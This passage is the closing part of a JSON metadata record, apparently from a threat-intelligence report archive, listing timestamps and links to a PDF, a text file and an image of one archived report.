            "reports": null
        }
    ],
    "ts_created_at": 1673536233,
    "ts_updated_at": 1743041173,
    "ts_creation_date": 1653693806,
    "ts_modification_date": 1653693806,
    "files": {
        "pdf": "https://archive.orkl.eu/bad66c94af4f1a2bc7f5b62367a71f7e4e2d2852.pdf",
        "text": "https://archive.orkl.eu/bad66c94af4f1a2bc7f5b62367a71f7e4e2d2852.txt",
        "img": "https://archive.orkl.eu/bad66c94af4f1a2bc7f5b62367a71f7e4e2d2852.jpg"
    }
}